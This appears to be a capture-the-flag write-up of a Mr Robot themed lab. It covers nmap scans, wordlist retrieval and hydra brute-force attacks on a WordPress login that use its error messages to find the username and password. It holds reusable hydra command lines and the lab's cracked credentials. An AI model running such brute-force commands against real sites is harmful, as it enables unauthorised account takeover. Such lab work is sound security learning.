# nmap scans
- scan ip address for open ports
	- 22/tcp closed ssh conn-refused
	- 80/tcp open http syn-ack
	- 443/tcp open https syn-ack

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T5 -vvv 10.10.74.16                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 12:03 EST
Initiating Ping Scan at 12:03
Scanning 10.10.74.16 [2 ports]
Completed Ping Scan at 12:03, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:03
Completed Parallel DNS resolution of 1 host. at 12:03, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:03
Scanning 10.10.74.16 [65535 ports]
Discovered open port 443/tcp on 10.10.74.16
Discovered open port 80/tcp on 10.10.74.16
Connect Scan Timing: About 8.21% done; ETC: 12:09 (0:05:46 remaining)
Connect Scan Timing: About 21.78% done; ETC: 12:07 (0:03:39 remaining)
Connect Scan Timing: About 35.52% done; ETC: 12:07 (0:02:45 remaining)
Connect Scan Timing: About 48.23% done; ETC: 12:07 (0:02:26 remaining)
Connect Scan Timing: About 63.98% done; ETC: 12:07 (0:01:33 remaining)
Connect Scan Timing: About 79.17% done; ETC: 12:07 (0:00:52 remaining)
Completed Connect Scan at 12:07, 266.99s elapsed (65535 total ports)
Nmap scan report for 10.10.74.16
Host is up, received syn-ack (0.22s latency).
Scanned at 2024-03-02 12:03:10 EST for 267s
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE REASON
22/tcp  closed ssh     conn-refused
80/tcp  open   http    syn-ack
443/tcp open   https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 267.28 seconds
```

- nmap scan to enumerate port 80 on the ip address, 
	- sV services
	- -T4 fast speed
	- -vvv highly verbose
	- --script vuln runs scripts to identify vulnerabilities on services
	- specifically 
		- |   /admin/: Possible admin folder
		- |   /admin/index.html: Possible admin folder
		- |   /wp-login.php: Possible admin folder
		- |   /robots.txt: Robots file
		- |   /feed/: Wordpress version: 4.3.1
		- |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
		- |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
		- |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
		- |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
		- |   /wp-login.php: Wordpress login page.
		- |   /wp-admin/upgrade.php: Wordpress login page.
		- |   /readme.html: Interesting, a readme.
		- |   /0/: Potentially interesting folder
		- |_  /image/: Potentially interesting folder
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 80 -sV -T4 -vvv --script vuln 10.10.74.16
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 13:27 EST
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 10.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:27
Completed NSE at 13:27, 0.00s elapsed
Initiating Ping Scan at 13:27
Scanning 10.10.74.16 [2 ports]
Completed Ping Scan at 13:27, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:27
Completed Parallel DNS resolution of 1 host. at 13:27, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:27
Scanning 10.10.74.16 [1 port]
Discovered open port 80/tcp on 10.10.74.16
Completed Connect Scan at 13:27, 0.24s elapsed (1 total ports)
Initiating Service scan at 13:27
Scanning 1 service on 10.10.74.16
Completed Service scan at 13:27, 6.46s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.74.16.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:27
NSE: [firewall-bypass 10.10.74.16] lacks privileges.
NSE Timing: About 97.99% done; ETC: 13:27 (0:00:01 remaining)
NSE Timing: About 98.66% done; ETC: 13:28 (0:00:01 remaining)
Completed NSE at 13:28, 66.94s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:28
NSE: [tls-ticketbleed 10.10.74.16:80] Not running due to lack of privileges.
Completed NSE at 13:28, 5.06s elapsed
Nmap scan report for 10.10.74.16
Host is up, received syn-ack (0.23s latency).
Scanned at 2024-03-02 13:27:17 EST for 79s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.74.16
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.74.16:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/BASE_URL1%22/live/%221;this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/js/BASE_URL1%22/live/%221;this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://10.10.74.16/
|     
|     Path: http://10.10.74.16:80/wp-login.php
|     Form id: loginform
|_    Form action: http://10.10.74.16/wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:28
Completed NSE at 13:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:28
Completed NSE at 13:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.22 seconds
```

# Navigate to ip address
- navigate to http://ip.ip.ip.ip
- reveals a mr robot style command line interface

- navigate to http://ip.ip.ip.ip/robots.txt
	- fsocity.dic - note misspelling
	- key-1-of-3.txt
![[Pasted image 20240302135447.png]]

- navigating to http://ip.ip.ip.ip/fsocity.dic and browser spins and connection times out

# wget for giant wordlist
- wget to pull down fsocity.dic
- fsocity.dic seems to be a giant wordlist
```bash
┌──(kali㉿kali)-[~]
└─$ wget http://10.10.74.16/fsocity.dic
--2024-03-02 13:48:56--  http://10.10.74.16/fsocity.dic
Connecting to 10.10.74.16:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic’
```

# Hydra to brute force username and password
- Use fsocity.dic word list with hydra to attack the poorly designed wordpress page and
	- 1. Brute force the username 
	- 2. Brute force the password

- using word press login page error to craft hydra command
![[Pasted image 20240302160418.png]]
- username - revealed elliot
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -L fsocity.dic -p test 10.10.0.129 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-02 15:02:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.0.129:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username
[80][http-post-form] host: 10.10.0.129   login: Elliot   password: test
[STATUS] 804.00 tries/min, 804 tries in 00:01h, 857431 to do in 17:47h, 16 active
[80][http-post-form] host: 10.10.0.129   login: elliot   password: test
[STATUS] 807.67 tries/min, 2423 tries in 00:03h, 855812 to do in 17:40h, 16 active
[STATUS] 809.00 tries/min, 5663 tries in 00:07h, 852572 to do in 17:34h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
- - `hydra`: This is the main command to invoke Hydra.
- -L fsocity.dic`: This option specifies a list of usernames to be tested during the attack, taken from the `fsocity.dic` file. `-L` is used when you have a list of usernames.
- `-p test`: This specifies the password to use for each username being tested. `-p` is used for a single password; in this case, "test" is used for all usernames.
- `http://10.10.0.129`: This is the target's URL or IP address.
- `http-post-form`: This tells Hydra to use the HTTP POST method for the form-based login.
- `"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"`: This is the path to the login form and the POST request's parameters.
- `/wp-login.php` is the login page for a WordPress site.
- `log=^USER^` and `pwd=^PASS^` are the parameters where Hydra will inject the username and password from the list.
-  `wp-submit=Log In` is the name of the submit button in the form.
- Invalid username` is the failure condition; Hydra looks for this text to determine if a login attempt failed. If this text is found in the response, Hydra understands that the provided credentials did not work.
In summary, this command uses Hydra to perform a brute-force attack against a WordPress login form located at `http://10.10.0.129/wp-login.php`. It tries all usernames from the `fsocity.dic` file with the password "test" and looks for the phrase "Invalid username" to identify failed login attempts. This kind of attack aims to identify valid login credentials by systematically trying various combinations of usernames and passwords.


- using wordpress error messages to craft hydra command.
	- "The password you entered"
![[Pasted image 20240302160154.png]]
- Password - ER28-0652
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -t 50 -l elliot -P fsocity-sort.dic 10.10.0.129 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-02 15:40:57
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 11452 login tries (l:1/p:11452), ~230 tries per task
[DATA] attacking http-post-form://10.10.0.129:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered
[STATUS] 2020.00 tries/min, 2020 tries in 00:01h, 9432 to do in 00:05h, 50 active

[80][http-post-form] host: 10.10.0.129   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-02 15:43:59
```

# Signing into Elliot's Wordpress dashboard
- Username - elliot
- Password - ER28-0652